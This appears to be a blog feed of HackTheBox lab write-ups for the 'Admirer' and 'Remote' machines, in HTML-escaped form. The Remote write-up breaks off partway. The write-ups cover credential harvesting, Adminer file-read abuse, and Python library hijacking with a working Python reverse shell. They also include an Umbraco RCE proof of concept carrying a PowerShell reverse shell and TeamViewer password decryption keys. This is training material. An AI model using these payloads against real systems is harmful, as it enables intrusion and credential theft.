&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.10.187/admin-dir/FUZZ.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-fuzzing.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.187/admin-dir/contacts.txt&lt;/code&gt;, the note reveal 5 mailbox with associated usernames and job title.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-note1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.187/admin-dir/credentials.txt&lt;/code&gt; we discover passwords :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-note2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;file-transfert-protocol&quot;&gt;File Transfert Protocol&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We use the FTP account find above to recover &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump.sql&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html.tar.gz&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-ftp.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The dump SQL show us interesting informations about :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-database_version.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From html archive, we find new credential &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;waldo.11 : Ezy]m27}OREc$&lt;/code&gt; in ../w4ld0s_s3cr3t_d1r/credentials.txt :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-database_new_password.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And an other credential set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;waldo : Wh3r3_1s_w4ld0?&lt;/code&gt; in ../utility-scripts/db_admin.php :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-database_info.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;adminer-tool&quot;&gt;Adminer tool&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;php file reveal interesting information about an alternative to php database.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// TODO: Finish implementing this or find a better open source alternative
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We find following site with Google search &lt;a href=&quot;https://alternativeto.net/software/phpmyadmin/&quot;&gt;https://alternativeto.net/software/phpmyadmin/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Directly match wich alternative tool is used : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admirer = Adminer&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And can confirm this to check : &lt;a href=&quot;http://10.10.10.187/utility-scripts/adminer.php&quot;&gt;http://10.10.10.187/utility-scripts/adminer.php&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-weaponization---find-exploit-way&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Weaponization - Find exploit way&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;adminer-v462&quot;&gt;Adminer v4.6.2&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Adminer is a popular PHP tool to administer MySQL and PostgreSQL databases.&lt;/p&gt;

&lt;p&gt;The version 4.6.2 contain a security hole that allowing them to read files on servers using the LOAD DATA LOCAL INFILE statement.
Attackers can abuse that to fetch passwords for popular apps such as Magento and Wordpress, and gain control of a site’s database.&lt;/p&gt;

&lt;p&gt;Reference exploit : &lt;a href=&quot;https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool&quot;&gt;https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;preparation-of-mysql-database-hosted&quot;&gt;Preparation of MySQL database hosted&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Database creation:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Database configuration:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Database connection:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit3.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Table creation to receipt data from victim server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit4.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are ready!&lt;/p&gt;

&lt;h2 id=&quot;3-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;adminer-exploitation&quot;&gt;Adminer exploitation&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Using the MySQL command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOAD DATA LOCAL&lt;/code&gt; to specifying a local file on the victim server. 
This command is used to load data from a file local to the Adminer instance, into a database.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit5.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we recover new password from files stealing:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit6.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now connect to adminer database of victim server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit7.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-adminer_exploit8.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reusing-password-on-remote-service-ssh&quot;&gt;Reusing Password on remote service SSH&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;But waldo user use the same password to login SSH service:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-metasploit_ssh_check.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-user&quot;&gt;Flag user&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-flag_user.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[4] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;sudo-permissions&quot;&gt;Sudo permissions&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;User waldo can run following command without root password: (ALL) SETENV: /opt/scripts/admin_tasks.sh&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-sudo_permission.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;python-library-hijacking&quot;&gt;Python library Hijacking&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;linpeas scan reveal interesting script named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.py&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script contain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shutil module&lt;/code&gt; and we can hijacking this.&lt;/p&gt;

&lt;p&gt;He offers a number of high-level operations on files and collections of files. In particular, functions are provided which support file copying and removal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-backup_script.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;References about this exploit:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.python.org/2/library/shutil.html&quot;&gt;https://docs.python.org/2/library/shutil.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7&quot;&gt;https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bic-berkeley.github.io/psych-214-fall-2016/using_pythonpath.html&quot;&gt;https://bic-berkeley.github.io/psych-214-fall-2016/using_pythonpath.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&quot;&gt;https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We check execution path of shutil.py library:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-check_path.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-check_path2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;payload-injection-in-malicious-library&quot;&gt;Payload Injection in malicious library&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Creation of malicious library shutil.py in /tmp/privuser45:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
import pty
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&quot;10.10.14.223&quot;,1337))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn(&quot;/bin/bash&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we change the PYTHON path execution to launch the malicious library when we execute the script admin_tasks.sh under root privilege:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-path_change.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-execution.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;obtaining-reverse-shell-and-flag-root&quot;&gt;Obtaining Reverse Shell and Flag root&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-flag_root.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;We must know. We will know.&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;David Hilbert&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>ScarNGone &amp; pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="Linux" /><category term="Easy" /><category term="WEB EXPLOITATION" /><category term="DATABASE EXPLOITATION" /><category term="Fuzzing" /><category term="PYTHON HIJACKING" /><category term="SUDO EXPLOITATION" /><category term="Adminer App" /><summary type="html">Ref°: HTB-16-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/admirer/HTB-Badge-Admirer.png" /><media:content medium="image" url="/assets/images/admirer/HTB-Badge-Admirer.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Remote Machine</title><link href="/posts/HTB-15-Pentest-Remote/" rel="alternate" type="text/html" title="Write-up Remote Machine" /><published>2020-09-25T11:00:00+02:00</published><updated>2020-09-25T11:00:00+02:00</updated><id>/posts/HTB-15-Pentest-Remote</id><content type="html" xml:base="/posts/HTB-15-Pentest-Remote/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-15-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Remote is a vulnerable machine through a misconfigured NFS share, a CMS with a vulnerability in its version that allows to get a foothold on the host.&lt;/p&gt;

&lt;p&gt;Once on the target machine, a privilege escalation is possible through a vulnerability in our version of Teamviewer with exploitation of regedit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Information-Remote.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;file-transfert-protocol&quot;&gt;File Transfert Protocol&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Anonymous FTP login allowed. Nothing to exploit here.&lt;/p&gt;

&lt;h3 id=&quot;website-and-cms-umbraco&quot;&gt;Website and CMS Umbraco&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-website.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;wfuzz tool reveal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;umbraco&lt;/code&gt; path behind the URL. 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install&lt;/code&gt; path response status code 302 and redirect on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;umbraco&lt;/code&gt;. This one response status code 200, we can check it directly.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.10.180/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-wfuzz.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Or we can get hint from source-page :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-source_page.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Umbraco is an open-source content management system (CMS) platform for publishing content on the World Wide Web and intranets. 
It is written in C# and deployed on Microsoft based infrastructure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-login_page.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This CMS seem to be exploitable from different vulnerabilities :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-searchsploit.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-metasploit.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;network-file-system&quot;&gt;Network File System&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/site_backups&lt;/code&gt; directory is mountable for everyone.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; 10.10.10.180
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-showmount.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can exploit a weakly configured NFS share to gain access to remote host followed by enumeration.&lt;/p&gt;

&lt;p&gt;References - exploiting nfs share : &lt;a href=&quot;https://resources.infosecinstitute.com/exploiting-nfs-share/#gref&quot;&gt;https://resources.infosecinstitute.com/exploiting-nfs-share/#gref&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;site_backups
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nfs 10.10.10.180:site_backups site_backups
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-mount.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;hashed-password-from-logfiles&quot;&gt;Hashed Password from logfiles&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We find many others files and folders.&lt;/p&gt;

&lt;p&gt;With a little ‘grep’ command in the NFS share, we search all string value in reference with “admin” “administrator” “password”.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin|administrator|password&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We find intereting files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;App_Data/Logs/*&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;App_Data/Umbraco.sdf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We find &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@htb.local&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssmith@htb.local&lt;/code&gt; users in logs files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-log_files.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We find hash value password of our users in the header of Umbraco.sdf file:&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head &lt;/span&gt;Umbraco.sdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-sdf_file.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;admin@htb.local : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;smith@htb.local : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;decrypting-password&quot;&gt;Decrypting Password&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;References - Decrypt SHA1 hash : &lt;a href=&quot;https://md5decrypt.net/Sha1/&quot;&gt;https://md5decrypt.net/Sha1/&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Password decrypt : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baconandcheese&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-decrypt_sha1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;obtaining-reverse-shell-with-rce-execution&quot;&gt;Obtaining Reverse Shell with RCE Execution&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;References - RCE umbraco :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/46153&quot;&gt;https://www.exploit-db.com/exploits/46153&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The script is a PoC, so we need to modify according to our environment.&lt;/p&gt;

&lt;p&gt;In the payload part add our reverse shell command in powershell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{ string cmd = &quot;$client = New-Object System.Net.Sockets.TCPClient(\'10.10.14.67\',4445);\
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); \
$sendback=(iex $data | Out-String); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'&amp;gt; \'; \
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);\
$stream.Flush();};$client.Close()&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
proc.StartInfo.FileName = &quot;powershell.exe&quot;; proc.StartInfo.Arguments = cmd;\
proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
&amp;lt;/msxsl:script&amp;gt;&amp;lt;xsl:template match=&quot;/&quot;&amp;gt; &amp;lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&amp;gt;\
&amp;lt;/xsl:template&amp;gt; &amp;lt;/xsl:stylesheet&amp;gt; ';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;proc.StartInfo.FileName = “powershell.exe”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the config part:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;login = “admin@htb.local”&lt;/li&gt;
  &lt;li&gt;password = “baconandcheese”&lt;/li&gt;
  &lt;li&gt;host = “http://10.10.10.180”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-payload.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We listen 4445 port and get reverse shell under iis service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-rev_shell.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-user&quot;&gt;Flag user&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;And we flag the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Public user&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-flag_user.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;3-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;teamviewer-7-exploitation&quot;&gt;Teamviewer 7 Exploitation&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;With the name of the machine we have a big hint to search way to escalate privilege and compromise the host : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote = TeamViewer&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;TeamViewer stored admin password encrypted with AES-128-CBC with they key of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0602000000a400005253413100040000&lt;/code&gt; and iv of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0100010067244F436E6762F25EA8D704&lt;/code&gt; in the Windows registry. 
We only need recover the value of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecurityPasswordAES&lt;/code&gt; in regedit to decrypt this with key and iv parameters.&lt;/p&gt;

&lt;p&gt;References - exploit method :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://whynotsecurity.com/blog/teamviewer/&quot;&gt;https://whynotsecurity.com/blog/teamviewer/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/n0fate/chainbreaker/issues/10&quot;&gt;https://github.com/n0fate/chainbreaker/issues/10&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;encrypted-password-from-registry&quot;&gt;Encrypted Password from Registry&lt;/h3&gt;
&lt;hr /&gt;

